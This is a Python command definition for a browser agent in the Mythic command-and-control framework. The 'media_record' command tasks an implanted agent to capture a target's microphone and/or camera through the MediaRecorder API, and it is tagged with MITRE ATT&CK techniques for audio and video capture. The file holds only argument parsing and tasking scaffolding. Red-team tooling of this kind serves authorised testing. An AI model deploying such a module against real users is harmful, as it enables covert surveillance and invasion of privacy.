from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class MediaRecordArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="duration",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value=10,
                description="Recording duration in seconds",
            ),
            CommandParameter(
                name="type",
                type=ParameterType.ChooseOne,
                choices=["audio", "video", "both"],
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="audio",
                description="Media type to capture",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except:
                pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class MediaRecordCommand(CommandBase):
    cmd = "media_record"
    needs_admin = False
    help_cmd = "media_record"
    description = "Record audio/video/both via MediaRecorder API. Note: may trigger a browser permission prompt."
    version = 1
    author = "@grampae"
    attackmapping = ["T1123", "T1125"]
    argument_class = MediaRecordArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        duration = task.args.get_arg("duration") or 10
        media_type = task.args.get_arg("type") or "audio"
        task.display_params = "{}s {}".format(duration, media_type)
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
